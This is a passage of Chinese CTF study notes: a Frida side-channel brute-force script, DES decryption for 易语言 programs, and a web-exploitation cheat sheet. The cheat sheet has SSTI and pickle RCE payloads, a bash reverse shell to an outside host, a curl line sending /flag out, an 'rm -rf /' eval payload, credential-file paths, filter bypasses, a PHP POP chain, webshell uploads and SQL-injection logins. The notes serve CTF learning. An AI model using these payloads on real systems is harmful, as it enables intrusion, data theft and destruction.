此时在输入不同值时会出现不同number，且输入正确number会增加，可利用此进行侧信道爆破 侧信道爆破 # -*- coding: UTF-8 -*- import subprocess import frida def is_right(): global new_number,number if new_number \u003e number: # number增加则猜测正确，更新 number = new_number return True else: return False def on_message(message, data): # 处理从注入的 JavaScript 脚本中发送回来的消息 global new_number if message['type'] == 'send': print(\"[*] {0}\".format(message['payload'])) new_number = message['payload'] elif message['type'] == \"error\": print(message[\"description\"]) print(message[\"stack\"]) print(message[\"fileName\"],\"line:\",message[\"lineNumber\"],\"colum:\",message[\"columnNumber\"]) else: print(message) pass printable = \"`!\\\"#$%\u0026'()*+,-./:;\u003c=\u003e?@[]^_{|}~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\" number = 709 # 测试脚本输出的number值 new_number = 0 flag = \"xxxctf{\" jscode = open(\"h00k.js\",\"rb\").read().decode() for index in range(len(flag),54): for i in printable: process = subprocess.Popen(\"test.exe\", # 启动程序 stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True) tmp_flag = (flag+i).ljust(53,\"A\")+\"}\" # 54 - 1 print(tmp_flag) print(\"try index:\",index ,\"chr :\",i) # 附加frida脚本到目标进程 session = frida.attach(\"test.exe\") script = session.create_script(jscode) # 在目标进程里创建脚本 script.on('message', on_message) # 注册消息回调 script.load() # 加载创建好的javascript脚本 process.stdin.write(tmp_flag) # 写入 output, error = process.communicate() # 获取输出 if(i == '`'): number = new_number elif(is_right() == True): flag +=i print(flag) break process.terminate() 最后一个字符还需要再次爆破 import subprocess flag = 'flag{xxxx }' for i in range(32,128): process = subprocess.Popen(\"test.exe\", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True) input_data = flag.replace(\" \",chr(i)) process.stdin.write(input_data) print(input_data) output, error = process.communicate() # 读取进程的输出 if (\"Invalid\" not in output.strip()): print('Output:', output.strip()) if error: print('Error:', error.strip()) process.terminate() ","date":"2024-10-09","objectID":"/reverse_note/:11:0","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"易语言 运行exe文件寻找逻辑：找点击类似的函数，分析输入经过的过程 易语言加密算法可选DES和RC4，RC4与标准算法结果相同，直接RC4解即可，DES算法和其他标准算法产生结果不同 DES算法解密 # 易语言特定解法，加密过程Key值每一个Byte都被按位倒转 from Crypto.Cipher import DES def reverse_bytes(b): # 翻转字节串 assert type(b) == bytes ba = bytearray(b) # 字节串转换为可变字节数组 for i in range(0, len(b)): ba[i] = int(format(b[i], '0\u003e8b')[::-1], 2) # format(b[i], '0\u003e8b') 将第i字节变为8位二进制01串 return bytes(ba) def get_new_key(key): # 新密钥生成函数 ba = bytearray(8) # 长度为8字节数组 i = 0 for b in key: ba[i] = b ^ ba[i] i = i + 1 if i \u003c 7 else 0 # 0-7 return bytes(ba) def remove_len(d): assert type(d) == bytes return d[4:] def e_des_decrypt(raw, key): des = DES.new(reverse_bytes(get_new_key(key)), DES.MODE_ECB) t = des.decrypt(raw) return remove_len(t) ","date":"2024-10-09","objectID":"/reverse_note/:12:0","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"寻找文件：/tmp，env，/etc/passwd 找文件名：find / -name \"*flag*.txt\" ","date":"2024-10-09","objectID":"/web_note/:0:0","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"工具 ","date":"2024-10-09","objectID":"/web_note/:1:0","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"HackBar devtools X-Forwarded-For: 127.0.0.1 // 只允许本机登录 // 识别通过HTTP代理或负载均衡器连接到Web服务器的客户端的原始IP地址 User Agent: // 向服务器发出请求的客户端软件 Referer: // 链接到当前请求页面的前一个网页的URL Cookie: xx=xx // 有时根据提示输入 Post data xx=xx\u0026xx=xx ","date":"2024-10-09","objectID":"/web_note/:1:1","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"Burpsuite Intruder模块：可以多线程对URL或data中的参数进行爆破 数据包结尾空2行 ","date":"2024-10-09","objectID":"/web_note/:1:2","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"dig 用于从域名系统（DNS）服务器中收集信息，在线网站：https://tool.lu/dns/index.html ","date":"2024-10-09","objectID":"/web_note/:1:3","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"扫描工具 扫描web目录，扫描目标：git泄露、源代码泄露 dirsearch python3 dirsearch.py -u http://xx.com:xx -x 403,301,302,429 -t 10 # 忽略403,301,302,429 -e php # 选择扫描 dirmap python3 dirmap.py -i http://target -lcf # 单目标 ","date":"2024-10-09","objectID":"/web_note/:1:4","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"GitHack .git泄露利用，重建还原源代码 python3 GitHack.py http://xxx/.git/ # 会在目录下得到源代码 ","date":"2024-10-09","objectID":"/web_note/:1:5","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"Linux 远程命令绕过 ping x:x:x:x ; ls ping xxx | ls 敏感文件 /etc/passwd /etc/shadow /etc/hosts /proc/net/arp //arp表，可以获得内网其他机器的地址 /root/.ssh/id_rsa /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys /etc/ssh/sshd_config %00截断 操作系统层漏洞，OS由C语言编写，以\\0作为字符串结尾，修改数据包插入\\0达成截断，可绕过软 WAF 白名单限制 ","date":"2024-10-09","objectID":"/web_note/:2:0","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"Python ","date":"2024-10-09","objectID":"/web_note/:3:0","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"基础知识 for index, num in enumerate(num_list): # num_list = [xx, xx] xxx # 可以获取索引和内容 secure_filename(file_name) # 清理文件名，去除潜在恶意字符 files.seek(0) # 重置文件指针到开头 timestamp = datetime.datetime.now().strftime('%Y%m%d%H%M%S') # 格式化输出时间 uuid.uuid4() # 通用唯一标识符（Universally Unique Identifier） os.environ # 查看系统环境变量 排列组合 from itertools import permutations flag = [\"a\", \"b\", \"c\"] item = permutations(flag) 图片处理 mimetypes.guess_type(file_path)[0] # 根据文件路径扩展名推断MIME类型 with Image.open(file_path) as img: # 图片打开 返回img对象 mime = img.get_format_mimetype() # 获取MIME类型 类 def __repr__(self) -\u003e str: # 重写自我描述信息, print时打印内容 return f\"xxx\" Flask app = Flask(__name__, template_folder='another') # 初始化flask应用 # 默认html模版文件在templates文件夹中, 此处指定为another app.config['some'] = xxx # 配置 app.run(host='0.0.0.0', port=5000) # 启动应用 @app.route('/hello', methods=['POST']) # 设置路由及函数 def func(): if xx not in request.files: # files是字典 return '错误信息', 400 # 状态码 return redirect(url_for('index')) # 重定向到主页 return render_template(\"index.html\", id = \"xx\") # 返回模版及id参数 request.method # \"POST\" request.files.get('key', None) # 字典找键, 未找到返回None Jinja2-模板引擎 # 自定义模板加载 env = Environment(loader=FileSystemLoader('static'), autoescape=True) # 加载方式: FileSystemLoader 从 static 文件夹中加载模板文件\".html\"等 # autoescape=True 安全机制: XML/HTML 自动转义特殊字符防止XSS攻击 # 重定义 渲染函数 def render_template(template_name, **context): # context是关键字参数, 如name=\"Alice\", age=30 template = env.get_template(template_name) # 加载模板 return template.render(**context) # context 字典渲染模板 ","date":"2024-10-09","objectID":"/web_note/:3:1","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"Debug命令执行 Flask框架，已知PIN码的情况下，访问http://xxx.xxx/console进入控制台输入PIN码进行RCE debug模式开启，报错会泄露源码及后台路径 import os os.chdir('path') # 切换目录 os.remove(file) # 删除文件 os.rmdir(directory) # 删除目录 os.makedirs('xx', exist_ok=True) # 创建目录 目标已存在不会抛出异常 os.path.exists('x') # 判断目录是否存在 for path, dirs, files in os.walk(folder, topdown=False): # 分别返回目录路径, 当前目录所有子目录名, 当前目录所有文件名, 从下到上遍历 file_save_path = os.path.join(folder, file) # 构建文件保存路径 file.save(file_save_path) # 文件保存在路径中 os.path.relpath(file_path, folder]) # 将文件绝对路径替换为关于folder的相对路径 # debug终端下, 直接输入os.system('xx')只会返回0, 表示成功 import subprocess # 命令列表形式传入 result = subprocess.run(['cat', 'flag'], stdout=subprocess.PIPE, # 捕获标准输出 stderr=subprocess.PIPE) # 捕获标准错误 print(result.stdout.decode()) # 显示 cat flag 命令输出 ","date":"2024-10-09","objectID":"/web_note/:3:2","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"SSTI模板注入 flask框架，Server-Side Template Injection，服务端模板注入 Jinja2 3种语法 {% %} {# 控制结构 #}\r{{ }} {# 变量取值 #} 内置函数及属性 __class__ # 调用的参数类型 __bases__ # 基类列表 __subclasses__() # 子类列表 __globals__ # 字典形式返回函数所在全局命名空间所定义的全局变量 __builtins__ # 内建模块引用 漏洞点 # {{id | safe}} 中 safe 表示值直接插入到HTML中, 不做任何转义, 可造成SSTI攻击 evil = content.replace('{{id | safe}}', id) # 将模板内容中的{{id | safe}}替换为id return render_template_string(evil) # 将替换后的字符串作为Jinja2模板渲染 测试是否是SSTI：{{7 * 7}} 是否返回 49或{{7+7}}是否返回14 os模块执行命令 {{config.__class__.__init__.__globals__['os'].popen('whoami').read()}} # 配置对象 \u003e 类 \u003e 初始化构造函数 \u003e 全局命名空间 \u003e os.popen('whoami').read() 执行命令 列举目录 {# 列举目录 #}\r{{ c.__init__.__globals__['__builtins__']['__import__']('os').listdir('/') }} 绕沙箱读取服务器代码 {# 空列表[] \u003e list类 \u003e 基类object \u003e 所有object子类 #}\r{% for c in [].__class__.__base__.__subclasses__() %}\r{% if c.__name__=='catch_warnings' %}\r{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}\r{% endif %}\r{% endfor %}\r{# payload #}\r{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %} 绕过 有黑名单过滤 字符串拼接 'o'+'s'\r'__imp'+'ort__'\r'/fl'+'ag' ","date":"2024-10-09","objectID":"/web_note/:3:3","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"反序列化漏洞 Pickel序列化及反序列化 class Pet: def __init__(self, name, species) -\u003e None: self.name = name self.species = species pet = Pet(name, species) # 序列化 serialized_pet = base64.b64encode(pickle.dumps(pet)).decode(\"utf-8\") # 反序列化 pet_data = base64.b64decode(serialized_pet) pet = pickle.loads(pet_data) RCE payload构造 class exp: # # __reduce__() 序列化时返回一个元组(可调用函数和参数元组)，反序列化时参数传递调用该函数 def __reduce__(self): return (os.system, (\"whoami\",)) malicious_payload = pickle.dumps(exp()) encoded_payload = base64.b64encode(malicious_payload).decode('utf-8') 无回显时考虑替换全局变量，在网页中的某变量中显示信息 class exp: def __reduce__(self): return (exec, ('import os; global store; store = os.environ[\"FLAG\"]',)) # python在局部改变全局变量时需要声明 global 过滤 pickle_data = base64.b64decode(data) for i in {\"os\",\"system\",\"eval\",\"setstate\",\"globals\",'exec','__builtins__','template', 'render','\\\\','compile','requests','exit','pickle',\"class\",\"mro\",\"flask\",\"sys\",\"base\",\"init\",\"config\",\"session\"}: 利用subprocess return (subprocess.check_output, ([\"cp\", \"/flag\", \"/app/app.py\"],)) # 直接返回命令的标准输出 return (subprocess.run, ([\"bash\", \"-c\", \"bash -i \u003e\u0026 /dev/tcp/$ip/$port 0\u003e\u00261\"],)) # 反弹shell ","date":"2024-10-09","objectID":"/web_note/:3:4","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"文件包含漏洞 # 直接访问服务器内部某端口文件 http://xxx/image?url=http://localhost:5728/image/flag.jpg ","date":"2024-10-09","objectID":"/web_note/:3:5","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"爬虫 网页请求 网页请求 import requests headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Accept': 'application/json' } proxies = { # 代理查看http包 'http': 'http://127.0.0.1:8080', # 'https': 'https://https_proxy:port' } data = { \"arg1\":\"val1\", \"arg2\": \"val2\", \"arg3\": f\"{a_variable}\" } # get response = requests.get(\"https://url\", headers=headers, cookies=cookies) # post response = requests.post(\"http://127.0.0.1:32585\", headers=headers, json=data, proxies=proxies) # json形式上传 response = requests.post(\"http://127.0.0.1:32585\", headers=headers, data=data, proxies=proxies) # xx=xx\u0026xx=xx形式上传 cookies = response.cookies # 获取cookies if response.status_code == 200: print(response.text) print(cookies.get_dict()) else: print(f\"状态码: {response.status_code}\") 爬虫匹配 from bs4 import BeautifulSoup soup = BeautifulSoup(html_content, 'html.parser') h1_tag = soup.find('h1', id='status') # \u003ch1 id=\"status\"\u003e if h1_tag: status_text = h1_tag.get_text(strip=True) # 获取标签内容并去除多余空白 print(status_text) ","date":"2024-10-09","objectID":"/web_note/:3:6","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"路径遍历漏洞 xxx.com?path=../../../../../../../../etc/passwd ","date":"2024-10-09","objectID":"/web_note/:3:7","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"PHP 环境搭建，在PHPSTUDY中的WWW界面下放入文件夹及代码即可 ","date":"2024-10-09","objectID":"/web_note/:4:0","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"基础知识 php版本7.3.22爬虫，首先检查robots.txt(表示网站不希望哪些页面被爬取), source.txt 隐藏源码：x.php.swp 变量覆盖可以窃取信息 一些基础代码 \u003c?php error_reporting(0); // 关闭所有错误报告 session_start(); // 允许脚本访问和修改用户的会话数据 ob_start(); // 开启输出缓冲，不从脚本发送任何输出 include(\"file.file\"); // 此文件包含file.file所有变量范围 include_once \"xx.php\"; // 指定文件载入并执行其中程序，若文件已被包含则不再包含 highlight_file(\"xx.php\"); // 将PHP代码高亮显示在网页 isset() // 判断一个变量是否已被设置, 且不为 null $arr=array($x, \"1\"); // 数组[ $x, \"1\" ] $$x = $y; // $x=\"user\", $y=\"admin\", 则 $user = \"admin\" strpos($content, $string); // 返回string在content第一次出现的索引, 否则返回false trim(addslashes($v)); // 去除首尾空白字符, 对\", ', \\, NULL添加反斜杠 // PHP 数组或对象编码为 JSON 格式的字符串 echo json_encode(array('status' =\u003e 0, 'info' =\u003e 'hello')); putenv(\"{$k}={$v}\"); // 定义环境变量 # url传参: ?env[xxx]=`xxx` unset($arr); // 清除变量 system(\"bash -c 'ls'\"); // 命令执行 die('FAIL'); // 终止程序并输出 exit($hh); // 会输出$hh变量值 exit; // 终止脚本执行 // 终端 php xx.php 执行 http // a变量值 $_POST['a']; // post请求 若为数组某值构造 : a[xxx]=xxx $_GET['a']; // get请求 // 循环处理 foreach ($_POST as $k=\u003e$v); // $k键, $v值 // 黑名单 $BlackList = \"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|\u0026|\\\"\"; if(preg_match(\"/{$BlackList}/is\",$post['query'])){}; // s使.可匹配换行符\\n防止换行绕过关键字过滤 preg_match('/flag/', $_GET['a'])// 检查是否存在匹配 flag 的子串 // /flag/i i 忽略大小写匹配, 即FlaG也会匹配 @preg_match(\"/^[a-zA-Z0-9]+\\.$/\", $b) // [a-zA-Z0-9]+ [x]: 表示匹配其中任何一个字符 +: 匹配前面一次或多次 // \\.: 匹配 . 因为只有 . 是匹配任何字符, 此处转义 {6}:至少重复6次，可不连续 // @表示隐藏报错 ^$锚定开头和结尾 header('Content-Type: ' . $mime_type); // 设置指定 HTTP 响应头 网络编程 $ch = curl_init(); // 初始化 cURL 会话句柄 // 设置 cURL 选项 curl_setopt($ch, CURLOPT_URL, $url); // 请求的url curl_setopt($ch, CURLOPT_HEADER, false); // 不获取响应头 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // 返回响应内容,不直接输出到控制台 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // 自动跟随重定向 URL $res = curl_exec($ch); // 执行 cURL 请求 curl_close($ch); 图片处理 $image_info = getimagesizefromstring($res); // 解析二进制数据, 获取图片信息 // 返回7值数组: [宽度][高度][图像类型常数之一][height=\"yyy\" width=\"xxx\"][bits:每种颜色的位数][MIME 类型] $mime_type = $image_info['mime']; 文件读写 $content = file_get_contents(\"filename.txt\"); file_put_contents(\"filename.txt\", \"New content\"); ","date":"2024-10-09","objectID":"/web_note/:4:1","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"PHP伪协议 URL格式：scheme://user:password@address:port/path?query#fragment data:// PHP\u003e=5.2.0，可使用data://数据流封装器传递数据 $a = $_POST['a']; if (file_get_contents($pen) !== 'hello') data://text/plain,hello 读取出 'hello' data://text/plain;base64,xx xx Base64 解码后读出内容 php://filter 读取源代码并进行base64编码输出 include($a); ?a=php://filter/read=convert.base64-encode/resource=flag.php ","date":"2024-10-09","objectID":"/web_note/:4:2","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"命令执行 Linux下命令： ls替代：dir 空格绕过：\u003c, ${IFS}, $IFS$9, %09, \u003c\u003e, \u003c, %20, $IFS cat命令替代：more, tail, head, less, nl, sort, tailf 截断字符替代：\u0026\u0026, ||, ;, %0a, | 反斜杠绕过：ca\\t fl\\ag.txt 编码绕过：echo 'a==' | base64 -d 单双引号绕过：c'a't, c\"a\"t 通配符绕过：f?ag, f*, f[a-z]ag, f{l,b}ag shell_exec(\"nslookup \" . $domain); // \u0026quot;为\"的html形式 若匹配flag，查看目录下文件内容 cat `ls` 环境变量注入实现命令执行 BASH_ENV：可以在bash -c的时候注入任意命令 BASH_ENV='$(id 1\u003e\u00262)' bash -c 'echo hello' # 将输入id以及hello 注入时对命令中字母进行编码绕过可在Linux下执行 # cat flag 字母转换: oct(ord('c'))[2:] # 每个字节前加上$ $'\\143'$'\\141'$'\\164' $'\\146'$'\\154'$'\\141'$'\\147' 反弹shell命令 使用花生壳，内网为kali地址及端口，外部为某域名 kali中nc -lnvp 5555即可 cat /flag | curl -d @- https://xx.xx.xx.xx:port # @-表示从标准输入读取, -d指定发送数据 ","date":"2024-10-09","objectID":"/web_note/:4:3","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"远程命令执行 RCE，Remote Command Execution eval($_POST['what']); 利用 what=\u003c?php system('rm -rf /'); ?\u003e // 删除系统所有文件 what=echo getcwd(); // 查看当前目录 what=print_r(scandir(getcwd())); // 查看当前目录所有文件和目录 what=print_r(scandir('../')); // 查看上一目录所有文件和目录 what=echo file_get_contents('filename.txt'); // 查看文件内容 无参函数RCE if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\/|zip:\\/\\//i', $cmd)) // 禁用协议 if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $cmd)) // 只能为无参函数嵌套形式: func(fun(h())); if (!preg_match('/pwd|tac|cat|chr|ord|ls|dir|conv|info|hex|bin|rand|array|source|file|cwd|dfined|system|assert|sess/i',$cmd)) // 黑名单过滤cmd @eval($cmd); **getallheaders()绕过————**返回当前请求的所有请求头信息（限Apache） var_dump(end(getallheaders()));测试是否可以获取到返回信息 ?cmd=eval(end(getallheaders())); // url // 及在burp数据包下最后一行加入以下任何一个进行命令执行 sky: phpinfo(); sky: system(\"ls\"); ","date":"2024-10-09","objectID":"/web_note/:4:4","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"常见绕过 MD5绕过 MD5 碰撞：两个不同的字符串 MD5 哈希值相等 php弱类型比较: 构造md5值为0e开头的科学计数法 if ($name != $password \u0026\u0026 md5($name) == md5($password)) payload： QNKCDZO 240610708 s878926199a s155964671a s214587387a php强类型比较: 构造数组 if ($name !== $password \u0026\u0026 md5($name) === md5($password)) // 0e字符串无法绕过 而 md5 函数传入数组的返回值都是NULL payload： url: password[]=2\u0026name[]=1 MD5哈希爆破 from hashlib import md5 for i in range(10000000): if md5(str(i).encode('utf-8')).hexdigest() == 'xxxx': print(i) 字符绕过 if (!is_numeric($a) \u0026\u0026 !is_numeric($b)) { // a和b不是数值 if ($a == 0 \u0026\u0026 md5($a) == $b[$a]){} } // 可以通过 a = false = 0 if($a \u003e 99) // a = 100abc也可通过且可绕过in_numeric 哈希函数绕过 hash_hmac('sha256', $a, $b); // $a为数组时，加密结果固定为NULL ","date":"2024-10-09","objectID":"/web_note/:4:5","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"反序列化漏洞 序列化 序列化：对象转换为字节序列，为保存对象方便重用 反序列化：字节序列恢复为对象 $c = serialize($arr); $a = unserialize($_GET['data']); // 已序列化的字符串还原为PHP的原始数据类型或对象 序列化格式 O:4:\"Test\":2:{s:1:\"a\";s:5:\"Hello\";s:1:\"b\";i:20;} 对象类型:长度:\"名字\":类中变量的个数:{类型:长度:\"名字\";类型:长度:\"值\";......} 类型字母 a - array b - boolean d - double i - integer o - common object r - reference s - string C - custom object O - class N - null R - pointer reference U - unicode string 魔术方法 当这些方法在某个类test中，如只有在test类中含有__invoke，某函数将对象当作函数调用触发才成功 public function __construct(){} // 构造函数 new一个类实例对象时调用 public function __destruct(){} // 析构函数 某对象的所有引用都被删除或对象被显式销毁时执行 public function __invoke(){} // 尝试将对象当作函数调用时触发 public function __set($a, $b){} // 魔术方法: 尝试给一个不存在或不可访问的属性赋值时被调用 // $a: 属性名 $b: 值 public function __toString(){} // 当对象被当作字符串使用时调用 比如 echo一个对象 public function __wakeup(){} // 序列化字符串被反序列化时调佣 public function __sleep(){} // 对象被序列化时调用 对象注入漏洞 操作序列化的对象来执行任意代码 两个条件： 必须具有一个实现PHP魔术方法的类 攻击中使用的所有类都必须在调用易受攻击的unserialize()时声明 代码构造出序列化串 \u003c?php class Name{ private $user = 'admin'; // 私有字段名在序列化时，类名及字段名前会加入\\0 } $test = new Name; print(serialize($test)); // O:4:\"Name\":1:{s:10:\"Nameuser\";s:5:\"admin\";} // 构造更新: O:4:\"Name\":1:{s:10:\"%00Name%user\";s:5:\"admin\";} 绕过 属性个数的值大于实际属性个数时，会跳过 __wakeup() 函数执行 例题——moectf2024【pop moe】 \u003c?php class class000 { private $payl0ad = 0; protected $what; public function __destruct() { $this-\u003echeck(); } public function check() { if($this-\u003epayl0ad === 0) { die('FAILED TO ATTACK'); } $a = $this-\u003ewhat; $a(); } } class class001 { public $payl0ad; public $a; public function __invoke() { $this-\u003ea-\u003epayload = $this-\u003epayl0ad; } } class class002 { private $sec; public function __set($a, $b) { $this-\u003e$b($this-\u003esec); } public function dangerous($whaattt) { $whaattt-\u003eevvval($this-\u003esec); } } class class003 { public $mystr; public function evvval($str) { eval($str); } public function __tostring() { return $this-\u003emystr; } } if(isset($_GET['data'])){ $a = unserialize($_GET['data']); } 构造链的过程： __destruct() \u003e check()【payl0ad为1】 \u003e 【what为class001】对象作为函数调用 \u003e __invoke() \u003e 【payl0ad为dangerous, a为class001】为不存在的payload赋值 \u003e __set(payload, dangerous) \u003e dangerous(this-\u003esec) \u003e 【sec为class003, 作为whaattt执行-\u003eevvval(class003)】 \u003e 对象作为字符串 \u003e __toString()返回mystr【mystr为执行的命令】 \u003e eval(mystr) 最终构造的data展开： O:8:\"class000\":2:{ s:7:\"payl0ad\";i:1; s:4:\"what\";O:8:\"class001\":2:{ s:7:\"payl0ad\";s:9:\"dangerous\"; s:1:\"a\";O:8:\"class002\":1:{ s:3:\"sec\";O:8:\"class003\":1:{ s:5:\"mystr\";s:10:\"phpinfo();\"; }; }; }; } 假设没有eval函数的情况，使用system(ls)命令进行RCE 字符注入 mb_strpos与mb_substr连用导致字符注入 function substrstr($data){ $start = mb_strpos($data, \"[\"); // 字符 \"[\" 首次出现的索引, 否则false $end = mb_strpos($data, \"]\"); return mb_substr($data, $start, $end + 1 - $start);// 多字节字符集的子字符串提取 } // '[' 开始 ']' 结束的所有字符 $key = substrstr($_GET[0].\"[helloJshirobro]\"); // 注入点 echo $key // ?0=%9f start=0, end=6, key=?[hello ?是字符乱码 // ?0=%f0 start=1, end=7, key=llo] // ?0=%9f%9f%9f%9fabcd start=4, end=10, key=abcd[he // ?0=%f0abc%9f start=4, end=10, key=ello] 效果类似右移(3-1)位 // %f0abc%0abc%9f:效果为右移(2*3-1)位 任意字符串构造 %9f不解析，造成字符串后移一位：%9f数量等于要构造的字符串长度%9f%9fab **%f0吞掉字符串三位：%f0加随便三个字符，结合%9f的后移，%f0abc%9f**达到字符串逃逸 注：substrtr函数逃逸出的字符不能大于原来的字符数量，此时可通过其他GET传入增加字符数量 payload构造： ?get1=(增加字符数量, 任意值)\u0026read=(n个%9f)(序列化字符串) 增长字符逃逸 function filter($str){ return str_replace('bb', 'ccc', $str); // n个bb将会多n个字符 } class A{ public $name='aaaabb'; public $pass='123456'; } $AA=new A(); echo serialize($AA).\"\\n\"; // O:1:\"A\":2:{s:4:\"name\";s:6:\"aaaabb\";s:4:\"pass\";s:6:\"123456\";} echo filter(serialize($AA)); // O:1:\"A\":2:{s:4:\"name\";s:6:\"aaaaccc\";s:4:\"pass\";s:6:\"123456\";} // s 多一个字符, 但只能解析6个, 逃逸了一个c 通过逃逸修改pass，payload为25个字符，即前加入25个’bb’，每个逃逸一个字符 $name='bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\";s:4:\"pass\";s:4:\"hack\";}' //$name: ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc //$pass: hack 例题——NepCTF2024【PHP_MASTER!!】 打入payload：URL( 47个%00, 即47个’\\0’ 增长型字符逃逸) ?c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00\";s:","date":"2024-10-09","objectID":"/web_note/:4:6","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"SSRF漏洞 漏洞点 $url = $_GET['url']; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); $res = curl_exec($ch); // 获取指定 URL 内容并输出 特殊文件协议 http://target.com/script.php?url=file:///etc/passwd #尝试让服务器本身执行命令 ","date":"2024-10-09","objectID":"/web_note/:4:7","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"文件上传漏洞 文件操作 if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") { $uploadDir = \"uploads/\"; // 上传目录 if (!file_exists($uploadDir)) { mkdir($uploadDir, 0777, true); // 创建目录 } if (!empty($_FILES['image']['name'])) { // $_FILES 超级全局数组, 专用于处理文件上传 $fileName = basename($_FILES['image']['name']); // 文件名 $allowedTypes = ['image/jpeg', 'image/png', 'image/gif']; // 文件验证 $fileType = $_FILES['image']['type']; if (!in_array($fileType, $allowedTypes)) { die('Error: Unsupported file type.'); } $maxSize = 2 * 1024 * 1024; // 2MB $fileSize = $_FILES['image']['size']; // 文件大小限制 if ($fileSize \u003e $maxSize) { die('Error: File size is too large.'); } // 构建完整文件路径 $filePath = $uploadDir . $fileName; // . 用于PHP字符串拼接 // 移动文件到指定目录 if (move_uploaded_file($fileTmpName, $filePath)) { echo \"上传图片在：\" . $filePath; } else { echo \"上传失败\"; } } else { echo \"无文件上传\"; } } 过滤 $ext = pathinfo($file_name, PATHINFO_EXTENSION); // 获取扩展名 if(in_array($ext, ['x','x'])){ exit('no'); } 上传一句话木马到相应目录中，且该目录可通过URL访问，使用蚁剑连接【url为文件地址，密码为post中数据】 https://www.cnblogs.com/ash-33/p/16397536.html中有一些一句话木马 图片木马 在cmd中运行copy pho.png/b+hello.php/a hack.png将图片和php木马结合 文件上传抓包 将下面filename改为hack.php即可 Content-Type: multipart/form-data; boundary=---------------------------1104904014997412098933705552 Content-Length: 727 DNT: 1 Connection: close Referer: http://127.0.0.1:40349/ Priority: u=0 -----------------------------1104904014997412098933705552 Content-Disposition: form-data; name=\"image\"; filename=\"hack.php\" Content-Type: image/png xxxxxx -----------------------------1104904014997412098933705552-- php拓展名 .php3，.php4，.php5，.php7，.phtml，.phps，.pht ","date":"2024-10-09","objectID":"/web_note/:4:8","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"SQL注入漏洞 MySQL中的注释： #，直接加注释内容，有时需要注意可能被解析为页内跳转，所以使用%23 --，--注释符后需要加一个空格，注释才能生效 /* */，多行注释符 -+，注释变体 php连接mysql $pwd = $_POST['pwd']; $pwd = md5($pwd); $conn = mysqli_connect(\"主机名\", \"用户名\", \"密码\", \"数据库名\", 端口); // 变量填$password if($conn){ die(\"Mysql connect error\"); } // 选择数据库 $selectDB = mysqli_select_db($conn, $dbName); sql fuzz：使用https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/sql-injection/detect/xplatform.txt中的数据结合 burpsuite 进行模糊测试 漏洞点 $sql = \"SELECT * FROM admin WHERE email='$email' AND pwd='$pwd'\"; $result = mysqli_query($conn, $sql); $row = mysqli_fetch_array($result); if ($row) {} 此处可使用payload： 万能密码型：admin' or 1 = 1# SELECT * FROM admin WHERE email='a@e.com'OR 1 = 1# AND pwd='$pwd' 联合型：b' 